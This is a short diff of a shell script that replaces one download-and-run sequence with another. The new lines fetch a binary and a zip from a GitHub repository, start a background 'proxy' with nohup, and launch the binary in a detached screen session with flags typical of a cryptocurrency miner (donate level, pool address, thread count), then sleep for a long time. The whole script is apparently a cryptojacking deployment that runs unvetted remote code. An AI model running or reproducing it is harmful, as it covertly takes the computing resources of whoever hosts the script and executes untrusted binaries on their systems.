@@ -1,3 +1,8 @@
-curl -O -L -J https://github.com/akumetaulu/symmetrical-octo-palm-tree/raw/refs/heads/main/redz.zip
-unzip redz.zip
-bash run.sh
+curl -O -L -J https://github.com/akumetaulu/symmetrical-octo-palm-tree/raw/refs/heads/main/bos
+curl -O -L -J https://github.com/akumetaulu/symmetrical-octo-palm-tree/raw/refs/heads/main/satu.zip
+unzip satu.zip
+chmod +x proxy
+nohup ./proxy &
+chmod +x bos
+screen -dmS play ./bos --donate-level 1 -o 127.0.0.1:1234 -t 4
+sleep 676253
